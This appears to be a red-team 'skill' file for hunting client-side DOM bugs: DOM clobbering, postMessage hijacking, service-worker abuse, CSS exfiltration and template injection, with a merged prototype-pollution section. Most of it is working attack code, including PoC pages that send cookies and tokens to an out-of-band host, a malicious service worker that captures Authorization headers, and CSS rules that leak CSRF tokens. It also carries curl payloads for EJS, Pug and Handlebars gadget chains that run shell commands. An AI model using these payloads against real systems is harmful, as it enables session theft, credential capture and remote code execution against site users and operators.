---
name: hunt-dom
description: "Hunt client-side DOM vulnerabilities — DOM Clobbering (overwrite JS globals via HTML injection), PostMessage hijacking (missing origin check), Service Worker abuse (intercept requests from same-origin script), CSS Injection/Exfiltration (attribute selectors → token char-by-char via OOB), client-side template injection, dangerouslySetInnerHTML. Grounded in named public research: Gareth Heyes / PortSwigger DOM-clobbering + DOM-Invader, Michał Bentkowski DOMPurify clobbering bypasses, jQuery htmlPrefilter XSS (CVE-2020-11022 / CVE-2020-11023), d0nut CSS-exfil research. Use when hunting DOM-XSS, client-side auth bypass, or token exfiltration without server-side interaction."
version: 1.1.0
revision_date: 2026-07-25
license: MIT
category: redteam
tags: [dom, hunt, redteam, xss]
---

# HUNT-DOM — DOM Clobbering / PostMessage / Service Worker / CSS Exfil

## Crown Jewel Targets

DOM-based attacks execute in the victim's browser — the server often never sees the payload, so WAFs and server-side input filters do not apply. PostMessage missing-origin-check = cross-origin token theft with no XSS needed.

**Highest-value chains:**
- **DOM Clobbering → DOM-XSS / auth bypass** — HTML *markup* injection (no `<script>`) overwrites a JS global like `window.config` or shadows `document.getElementById`, and the app later treats that value as a URL/code → sink fires under a markup-only injection where script is filtered.
- **PostMessage no origin check → session theft / DOM-XSS** — a `message` handler that trusts `event.data` without validating `event.origin` lets an attacker iframe/opener drive privileged actions or feed a sink.
- **Service Worker abuse** — register a **same-origin** SW script (reachable because of an upload / open-redirect / path the target serves) via stored XSS → intercept all in-scope `fetch` → persistent credential capture.
- **CSS Exfil** — attribute-value selectors (`input[value^="a"]`) leak a CSRF token / API key / nonce char-by-char to an OOB host with zero JS.

### Grounding — public research this is distilled from
- **DOM Clobbering / DOM-Invader** — Gareth Heyes & the PortSwigger Web Security Academy "DOM clobbering" topic; DOM-Invader ships a dedicated clobbering scanner. Sink taxonomy maps to the academy's DOM-based vulnerability labs.
- **DOMPurify clobbering & mXSS bypasses** — Michał Bentkowski (Securitum) blog series on bypassing HTML sanitizers via clobbering and mutation XSS.
- **jQuery `htmlPrefilter` self-closing-tag XSS** — **CVE-2020-11022** and **CVE-2020-11023** (jQuery < 3.5.0). Passing attacker HTML to `.html()` / `.append()` mutates into executing markup. Grep bundled jQuery version; this is one of the most common real-world DOM-XSS roots.
- **CSS exfiltration** — d0nut "CSS Injection Attacks" / "Stealing Data With CSS" research (sequential `@import` recursion to drop the per-char-position constraint).
> Cite only what you reproduce. Do not paste these as "proof" in a report — your PoC against the live target is the evidence. Named research here is for *technique provenance*, not severity inflation.

---

## Attack Surface Signals

```
# Injection points that allow MARKUP but may strip <script>:
user bio / display name / comment / markdown preview / SVG upload / CMS rich-text

# postMessage endpoints (iframes, SSO widgets, payment frames, chat widgets):
*/sso/*  */embed/*  */widget/*  */oauth/*  /sdk.js  pay/checkout iframes

# Service worker presence:
/sw.js  /service-worker.js  /firebase-messaging-sw.js  /ngsw-worker.js (Angular)

# CSS injection points:
?theme=  custom-css profile field  email-template editor  style= passthrough
```

---

## Phase 1 — DOM Clobbering

```bash
# Signal: app reads element IDs/names as if they were JS objects, OR feeds a
# clobberable global into a sink (location, innerHTML, eval, script.src).
# Inject MARKUP (no script) at a sink that lets named/id'd elements through.

# Single-level clobber of window.config:
#   <a id="config" href="https://evil.com">
# Clobber a NON-built-in global the app reads (built-in methods like getElementById can't be shadowed this way):
#   <a id="config"></a><a id="config" name="url">   # window.config.url resolves to an attacker-controlled element/string
# Clobber a string-coerced URL value (anchor toString() == href):
#   <a id="x"></a><a id="x" name="y" href="https://evil.com">   # x.y -> href
# Nested window.a.b.c via form/inputs:
#   <form id="a"><input id="b" name="c" value="clobbered"></form>
# baseURI / relative-URL hijack:
#   <base href="https://evil.com/">      # bends every relative src/href
```

```javascript
// Browser console: find globals that are clobberable AND reach a sink.
// A var only matters if the app later concatenates it into a URL/HTML/eval.
const susp = ['config','settings','options','appConfig','init','data','user',
  'token','csrf','nonce','baseUrl','apiUrl','cdn','redirect','next','debug'];
susp.forEach(k => {
  const v = window[k];
  // HTMLCollection / element => already clobbered or clobberable namespace
  if (v && (v instanceof Element || v instanceof HTMLCollection))
    console.log('[CLOBBERED/NAMESPACE]', k, v);
  else if (v !== undefined) console.log('[GLOBAL]', k, '=', v);
});
```

```bash
# Source review: find globals fed into sinks (this is what makes clobbering exploitable)
curl --max-time 30 --connect-timeout 10 -s "https://$TARGET/" | grep -nE \
  "document\.(getElementById|baseURI)|window\.[A-Za-z_]+\.(url|src|href|html|cmd)|\
location\s*=\s*[A-Za-z_]|\.innerHTML\s*=|eval\(|new Function\(|\.src\s*=\s*[A-Za-z_]"
# DOM-Invader (Burp) → enable "DOM clobbering" — it auto-finds clobberable sources→sinks.
```

**jQuery angle:** if the bundle ships jQuery < 3.5.0, attacker HTML passed to `.html()`/`.append()` self-mutates to execute (**CVE-2020-11022 / CVE-2020-11023**). Confirm version then test `<style><style /><img src=x onerror=alert(document.domain)>`.

---

## Phase 2 — PostMessage Hijacking

Two bug classes: (a) **listener** trusts cross-origin data → drive a sink/privileged action; (b) **sender** broadcasts secrets with target origin `'*'` → any framing page reads them.

```bash
# Find handlers and flag the ones with NO origin check
grep -rnE "addEventListener\(\s*['\"]message['\"]|onmessage\s*=" recon/$TARGET/ --include="*.js" 2>/dev/null \
  | grep -vE "\.origin\b" 
# Then for each, read +/- 20 lines: where does event.data go? (innerHTML/eval/location/token store)
# Senders that leak: grep for postMessage(<secret>, '*')
grep -rnE "postMessage\([^,]+,\s*['\"]\*['\"]\)" recon/$TARGET/ --include="*.js" 2>/dev/null
```

```html
<!-- PoC A: drive a no-origin-check LISTENER from an attacker page -->
<!-- Host on attacker.com; frames target and pushes a privileged message -->
<iframe id="f" src="https://TARGET/page-with-listener"></iframe>
<script>
  document.getElementById('f').onload = () => {
    const w = document.getElementById('f').contentWindow;
    // Shape the payload to whatever the handler routes into a sink:
    w.postMessage({type:'navigate', url:'javascript:fetch("https://OOB/x?c="+document.cookie)'}, '*');
    w.postMessage('<img src=x onerror=fetch("https://OOB/dom?h="+btoa(document.body.innerHTML))>', '*');
  };
</script>
```

```html
<!-- PoC B: capture secrets from a SENDER that uses targetOrigin '*' -->
<iframe id="f" src="https://TARGET/sso-or-widget" style="display:none"></iframe>
<pre id="out"></pre>
<script>
addEventListener('message', e => {
  // Only count it if e.origin is the TARGET and data carries a secret
  out.textContent += `origin=${e.origin}\ndata=${JSON.stringify(e.data)}\n---\n`;
  if (/token|session|jwt|code=/i.test(JSON.stringify(e.data)))
    fetch('https://OOB/pm?d='+encodeURIComponent(JSON.stringify(e.data))); // OOB proof
});
</script>
```

> False-positive guard: a handler with a *partial* check (`origin.indexOf('target.com')>-1`, `endsWith('target.com')`, regex `target\.com`) is still vulnerable — bypass with `target.com.evil.com` or `eviltarget.com`. Confirm by serving the PoC from such a look-alike host and showing the message still lands.

---

## Phase 3 — Service Worker Abuse

**Hard rule (corrects a common mistake):** a SW script URL **must be same-origin** as the page calling `register()`. A cross-origin script URL (`https://evil.com/sw.js`) throws `SecurityError` — there is **no header that enables cross-origin SW *script* registration**. `Service-Worker-Allowed` only widens the **scope** a same-origin script may control, not where the script may live.

So the realistic path is: get a SW script **onto the target origin** (file upload that serves JS, open-redirect/path the origin reflects as a script, a JSON/JSONP endpoint with `text/javascript`, or an existing route under your control), then register it from same-origin XSS.

```bash
# Enumerate existing SW + its scope
curl --max-time 30 --connect-timeout 10 -s "https://$TARGET/" | grep -iE "serviceWorker\.register|navigator\.serviceWorker"
for p in sw.js service-worker.js firebase-messaging-sw.js ngsw-worker.js; do
  curl --max-time 30 --connect-timeout 10 -s -o /dev/null -w "%{http_code} $p\n" "https://$TARGET/$p"; done
curl --max-time 30 --connect-timeout 10 -s "https://$TARGET/sw.js" | grep -iE "scope|addEventListener\('fetch'|caches"
# Look for an upload/route that returns Content-Type: text/javascript on YOUR content:
#   curl -s -D- https://$TARGET/uploads/<id> | grep -i content-type
```

```javascript
// Runs in same-origin XSS. SCRIPT MUST BE SAME-ORIGIN (e.g. /uploads/evil-sw.js
// served by the target). scope must be <= the directory the script is served from
// unless the response carries Service-Worker-Allowed.
navigator.serviceWorker.register('/uploads/evil-sw.js', {scope: '/'})
  .then(r => fetch('https://OOB/sw-registered?scope='+r.scope))  // OOB proof of registration
  .catch(e => console.log('SW reg failed', e.name));  // SecurityError => wrong origin/scope

// evil-sw.js (served from the TARGET origin):
self.addEventListener('fetch', e => {
  e.respondWith(fetch(e.request.clone()).then(async resp => {
    // Exfil URL + any auth header the page attaches, to OOB
    fetch('https://OOB/sw-intercept', {method:'POST',
      body: JSON.stringify({url: e.request.url,
        auth: e.request.headers.get('authorization')})});
    return resp;
  }));
});
```

> Persistence note: a SW survives tab close and re-runs on next visit within scope — that is what makes it Critical. Confirm persistence by closing all tabs, reopening the origin, and showing a fresh OOB hit with no XSS re-trigger.

---

## Phase 4 — CSS Injection / Exfiltration

```bash
# Prereq: attacker controls CSS (custom-theme field, style= passthrough, email
# template, markdown CSS). Targets: hidden CSRF input, API key in meta, nonce attr.
# Step 1 confirm injection: inject "color:red" on a known element, observe render.
# Step 2 leak attribute values char-by-char via attribute selectors + url() to OOB.
```

> **Scope caveat (corrects an overstatement):** CSS exfil bypasses CSP that blocks *script execution* — it does **not** bypass a CSP whose `style-src` / `img-src` / `default-src` / `connect-src` restricts external origins, or `form-action`. If `img-src 'self'` is set, `url(https://OOB/...)` is **blocked**. Always read the live `Content-Security-Policy` header first; if external resource origins are locked down, CSS exfil is dead and you should say so rather than claim it.

```css
/* One request fires only for the matching first char. */
input[name="csrf"][value^="a"] { background: url(https://OOB.example/c?p=0&c=a); }
input[name="csrf"][value^="b"] { background: url(https://OOB.example/c?p=0&c=b); }
/* ...all chars... then chain @import to leak position 1 conditioned on position 0, etc. */
meta[name="csrf-token"][content^="a"] { background: url(https://OOB.example/c?m=a); }
```

```python
# Generate a single-position CSS exfil set (loop positions with sequential @import in practice)
import string
chars = string.ascii_letters + string.digits + '-_'
attr, oob, pos = 'name="csrf"', 'https://OOB.example/c', 0
print("\n".join(
  f'input[{attr}][value^="{c}"]{{background:url({oob}?p={pos}&c={c})}}' for c in chars))
# Real exfil needs recursion: serve a stylesheet whose @import pulls the next
# position's rules only after the current prefix matched (d0nut technique) —
# this removes the "static input, one char" limitation.
```

> Validation: the proof is **OOB hits**, not a rendered color. Stand up a Collaborator / request-bin and show one hit per correct character forming the real token, then demonstrate using that token in a state-changing CSRF request. No OOB callback = no finding (a 0-byte image or CSP-blocked request looks identical to success in DevTools).

---

## Phase 5 — dangerouslySetInnerHTML / framework sinks

```bash
grep -rnE "dangerouslySetInnerHTML|v-html=|\[innerHTML\]=|\.html\(" recon/$TARGET/ --include="*.js" 2>/dev/null
# In minified Next/React bundles:
curl --max-time 30 --connect-timeout 10 -s "https://$TARGET/_next/static/chunks/pages/index.js" | grep -Eo 'dangerouslySetInnerHTML.{0,120}'
# Trace whether user data reaches it WITHOUT a sanitizer (DOMPurify/sanitize-html).
# If DOMPurify IS present, check for clobbering/mXSS bypass (Bentkowski research) and version.
```

---

## Phase 6 — Client-Side Template Injection

```bash
# Detect framework, then test the {{}} sink in a sandbox-bypass form.
grep -rnE "angular|vue|handlebars|mustache|nunjucks|alpinejs|\bv-|ng-app" recon/$TARGET/ --include="*.js" 2>/dev/null | head
# Probe (server may render, so confirm it's CLIENT-side by viewing rendered DOM, not curl):
#   {{7*7}}  -> 49 in the live DOM (not in raw HTML) => CSTI
# AngularJS sandbox-escape style payloads (version-dependent; older 1.x):
#   {{constructor.constructor('alert(document.domain)')()}}
# Vue: {{_c.constructor('alert(1)')()}}    (varies by Vue 2/3 build)
```

---

## Chain Table

| DOM finding | Chain to | Impact |
|-------------|----------|--------|
| DOM Clobbering → clobbered URL into `script.src`/`location` | DOM-XSS under markup-only injection | High / auth bypass |
| PostMessage no/weak origin check (listener) | data → innerHTML/eval/location sink | DOM-XSS → ATO |
| PostMessage `targetOrigin:'*'` sender | any framing page reads token/auth code | Cross-origin token theft |
| CSS exfil (OOB-confirmed) | leak CSRF token → fire CSRF | CSRF chain (Medium+) |
| Same-origin Service Worker via XSS | intercept all in-scope fetch + auth headers | Persistent ATO (Critical) |
| dangerouslySetInnerHTML, no sanitizer | stored DOM-XSS | XSS → ATO |

---

## Tools

```bash
# DOM Invader (built into Burp browser) — sources→sinks, postMessage logger, clobbering scanner
# postMessage-tracker — Chrome extension logging cross-window messages
# Burp Collaborator / interactsh / request-bin — MANDATORY OOB sink for CSS-exfil & SW PoCs
# Verify any command URL before citing it in a report; do not paste unverified repo links.
```

---

## Validation (false-positive discipline)

Match the repo standard: a technique that *fires in DevTools* is not a finding until impact is **OOB-confirmed** and **state-proven**.

- **DOM Clobbering** — show the clobbered value actually reaching a sink (XSS payload executes, or app navigates/loads from attacker URL). A clobberable global that never reaches a sink = no impact, do not report.
- **PostMessage** — distinguish a *missing* check from a *weak* one; bypass weak checks from a look-alike origin and capture via OOB. A noisy `message` log alone is not proof — show the privileged action or token exfil.
- **CSS exfil** — **OOB callback per correct character is the only proof.** Read CSP first: `img-src`/`style-src`/`connect-src`/`default-src` restricting external origins kills it. A blocked `url()` is indistinguishable from success in the Network tab — confirm on the Collaborator side.
- **Service Worker** — registration must be **same-origin script**; a `SecurityError` means you cited the wrong origin. Prove *persistence* (close tabs → reopen → fresh OOB hit, no XSS re-fire).
- **General** — unique per-test markers (`btoa(domain)+nonce`) so an OOB hit is attributable to YOUR payload and not background traffic; body-diff the rendered DOM, not the raw HTML, since these are client-side.

**Severity:**
- Same-origin Service Worker → persistent credential intercept: **Critical**
- PostMessage data → DOM-XSS / token theft → ATO: **High–Critical**
- DOM Clobbering → DOM-XSS reaching auth/session: **High**
- CSS exfil of CSRF token (OOB-proven) → CSRF: **Medium** (raise if the chained CSRF is account-critical)

---

## MDPsec Verified Patterns (real DOM/postMessage reports)

Real-world primitives from mdpsec.com reports:

1. **Wildcard postMessage login code leak** — production login bundle's `handleOpener` runs on real login origin whenever URL carries `?flow=popup`; posts `{name:'login-success', token, code}` to `opener.postMessage(loginSuccessMessage, '*')` — wildcard target delivers OAuth code to ANY opener window regardless of origin → exchange for 100-hour bearer → silent PATCH email without re-auth (92).
2. **postMessage origin short-circuit + CSS skimmer** — embedded-checkout card form: origin check short-circuited by a hardcoded flag (form accepts init message from ANY framing site); no X-Frame-Options/CSP frame-ancestors → any site iframes genuine form; init message carries styling object; `font-family` concatenated raw into `<style>` → a single `}` closes rule → arbitrary CSS injection inside card-data origin; card digits reflected into `value` attribute → CSS attribute-selector exfil `input#card-number[value^="4000 0"] { background-image: url(attacker/leak/40005); }` — every matched char fires image beacon → full PAN+expiry+CVC reconstructed (80).
3. **CSS injection in page-builder eval()** — style variables stored plaintext, fed into `eval('applyStyles({' + parameters.join(',') + '})')`; payload `" '})+eval(String.fromCharCode(...))//"` (16).
4. **Bridge postMessage without origin check** — JS bridges exposed via `addJavascriptInterface`/native hooks callable from any loaded frame; token/signing-key exfil (17, 22, 37, 120). See `hunt-mobile-deeplink-webview` for the full mobile bridge catalog.

Cross-ref `mdpsec-report-knowledge` for the full index.

## Verification

Run this self-test to confirm dom hunting readiness:

1. **Skill integrity** — confirm the skill file is readable and well-formed:
   ```bash
   grep -q "name: hunt-dom" SKILL.md && echo "PASS: skill frontmatter present" || echo "FAIL"
   grep -q "revision_date:" SKILL.md && echo "PASS: revision date present" || echo "FAIL"
   ```

2. **Category check** — confirm the skill has a category:
   ```bash
   grep -q "category:" SKILL.md && echo "PASS: category present" || echo "FAIL"
   ```

3. **Pitfalls section** — confirm pitfalls are documented:
   ```bash
   grep -q "^## Pitfalls" SKILL.md && echo "PASS: pitfalls section present" || echo "FAIL"
   ```

All 3 tests verify the skill is properly structured and ready for use.

---

## Pitfalls
- **DOM XSS without sink confirmation** — finding `innerHTML` or `document.write` with user input is a potential sink, not a confirmed bug. Trace the full data flow from source to sink.
- **postMessage without origin check** — receiving postMessage events without verifying `event.origin` is the vulnerability. Test with `window.postMessage(payload, '*')`.
- **Source maps without secrets** — `.map` files alone are informational. Need extracted API keys, internal paths, or credentials.
- **eval with static strings** — `eval("constant")` is not exploitable. Need dynamic input reaching eval.
- **Sanitizer bypass claim without proof** — claiming DOMPurify bypass requires a working payload against the specific version in use.


---

## Content from local version



## Debugging hDOM
```bash
# 1. Set breakpoint on suspected source
# 2. Walk through DOM processing
# 3. Check if input reaches fetch/XHR/location
# 4. Check what transformations happen (sanitization?)
# 5. Test bypasses

# In browser console:
monitorEvents(window, 'message')
```



## Quick Detection

```bash
# client-side: pollute via query param
curl -sk "https://target.com/page?__proto__[polluted]=true"

# server-side: pollute via JSON body
curl -sk -X POST "https://target.com/api/config" \
  -H "Content-Type: application/json" \
  -d '{"__proto__":{"isAdmin":true}}'
```



## Testing Checklist
- [ ] Find all DOM sources (URL params, hash, referrer, postMessage)
- [ ] Trace source → sink paths
- [ ] Test if input controls fetch/XHR URL
- [ ] Test path traversal (../) in URL params
- [ ] Test if input flows to window.location
- [ ] Test if input flows to script.src
- [ ] Test if input flows to innerHTML
- [ ] Test postMessage origin validation



## References
- Notion: NARUTO HUNT (Hunt tips page)

---
# Merged from: hunt-prototype-pollution

# Prototype Pollution Hunting

Hunt for prototype pollution vulnerabilities where user-supplied properties merge into `Object.prototype`, affecting all objects in the runtime. Client-side pollution enables DOM XSS, cookie manipulation, and auth bypass. Server-side pollution chains to RCE via gadget chains in template engines (EJS, Pug, Handlebars) and CLI wrappers (child_process, NODE_OPTIONS).



## Procedure

### Phase 1 — Client-Side Pollution Vectors

```bash
# URL query string
https://target.com/?__proto__[test]=polluted
https://target.com/?constructor[prototype][test]=polluted

# JSON body in API
curl -sk -X POST "https://target.com/api/data" \
  -H "Content-Type: application/json" \
  -d '{"__proto__":{"polluted":"yes"}}'

# Form-encoded
curl -sk -X POST "https://target.com/form" \
  -d '__proto__[polluted]=true'

# Via Object.assign / spread in request handlers
curl -sk -X PATCH "https://target.com/api/settings" \
  -H "Content-Type: application/json" \
  -d '{"constructor":{"prototype":{"isAdmin":true}}}'
```

### Phase 2 — Server-Side RCE via Gadget Chains

**EJS RCE (outputFunctionName):**
```bash
curl -sk -X POST "https://target.com/api/render" \
  -H "Content-Type: application/json" \
  -d '{"__proto__":{"outputFunctionName":"_tmp;global.process.mainModule.require(\"child_process\").execSync(\"id\");"}}'
```

**Pug RCE (self.block):**
```bash
curl -sk -X POST "https://target.com/api/preferences" \
  -H "Content-Type: application/json" \
  -d '{"__proto__":{"block":{"type":"Text","line":"process.mainModule.require(\"child_process\").execSync(\"id\")"}}}'
```

**Handlebars RCE (compileFunction):**
```bash
curl -sk -X PUT "https://target.com/api/profile" \
  -H "Content-Type: application/json" \
  -d '{"__proto__":{"precompileOptions":{"knownHelpersOnly":false,"compat":true},"compileFunction":"return process.mainModule.require(\"child_process\").execSync(\"id\").toString();"}}'
```

**NODE_OPTIONS injection:**
```bash
curl -sk -X POST "https://target.com/api/task" \
  -H "Content-Type: application/json" \
  -d '{"__proto__":{"NODE_OPTIONS":"--require /proc/self/environ","shell":"/bin/sh","env":{"NODE_DEBUG":"test"}}}'
```

### Phase 3 — Filter Bypass Techniques

```bash
# Unicode normalization (e.g., ä → a)
https://target.com/?__proto__[test]=1         # blocked
https://target.com/?__pröto__[test]=1         # bypass (ä normalizes to a)

# constructor.prototype path
curl -sk -X POST "https://target.com/api/data" \
  -d '{"constructor":{"prototype":{"polluted":true}}}'

# Array pollution (lodash specific)
curl -sk -X POST "https://target.com/api/data" \
  -d '{"__proto__":{"polluted":[]}}'  # forces array coercion

# ppfuzz — automated prototype pollution scanner
ppfuzz -u https://target.com/api/merge -m POST -H "Content-Type: application/json"
```

### Phase 4 — Client-Side Exploitation

```javascript
// Verify pollution in browser console
Object.prototype.polluted  // should return the injected value

// DOM XSS via polluted options
// If the app uses jQuery $.extend with polluted {url: "javascript:alert(1)"}

// Auth bypass: pollute isAdmin
// If the app checks if (user.isAdmin) without hasOwnProperty
```

### Phase 5 — Second-Order Pollution

```bash
# Store pollution in database, triggered by background job
curl -sk -X POST "https://target.com/api/profile" \
  -H "Content-Type: application/json" \
  -d '{"name":{"__proto__":{"isAdmin":true}}}'

# Later, when an admin views the profile or a cron job processes it,
# the pollution triggers in that context
```



## Sink Types
```javascript
// fetch with user input in URL
fetch('/api/' + userInput)
fetch(`/api/${userInput}`)

// XMLHttpRequest
new XMLHttpRequest().open('GET', '/api/' + userInput)

// Location assignment
window.location = userInput
location.href = userInput

// Dynamic script loading
var script = document.createElement('script');
script.src = '/assets/' + userInput;
```



## Related Skills

- **`hunt-nodejs`** — Node.js-specific vulnerabilities including prototype pollution in Express/Next.js.
- **`hunt-xss`** — DOM XSS often exploitable through client-side prototype pollution.
- **`hunt-api-misconfig`** — Object merge on request bodies without `hasOwnProperty` checks.

## Source Types
```javascript
// URL parameters
new URLSearchParams(window.location.search).get('param')
new URL(window.location.href).searchParams.get('param')

// Hash/fragment
window.location.hash
window.location.hash.substring(1)

// Referrer
document.referrer

// postMessage
window.addEventListener('message', function(e) {
  // e.data → user controlled
});

// localStorage (if attacker can inject)
localStorage.getItem('userInput')

// Cookie values
document.cookie
```



## When to Use

- Application uses JavaScript/Node.js with object merge, clone, or extend operations on user input.
- jQuery `$.extend(true, ...)` or `$.fn.merge()` with deep copy on untrusted data.
- Lodash `_.merge()`, `_.defaultsDeep()`, `_.set()` receiving request body/query params.
- Template engines (EJS, Pug, Handlebars) in the same runtime as user-controlled objects.
- Server-side Node.js with `child_process.exec`/`spawn` accessible via polluted options.



## Vulnerabilities from hDOM

| Pattern | Vulnerability |
|---------|--------------|
| `fetch("/api/"+input)` with `../` | **CSPT** |
| `window.location=input` | **Open Redirect** |
| `fetch(url)` with auth cookie | **CSRF** |
| `script.src=input` | **XSS** (if attacker controls response) |
| `innerHTML = response` | **DOM XSS** |



## Key Insight from NARUTO HUNT
> "If a DOM link using our input results in making an HTTP request with our input, it can lead to a modern csrf or cspt vulnerability."
> "DOM + input → HTTP request + input → hDOM"



## The hDOM Flow
```
source (user input) → DOM processing → sink (HTTP request) → vulnerability
```

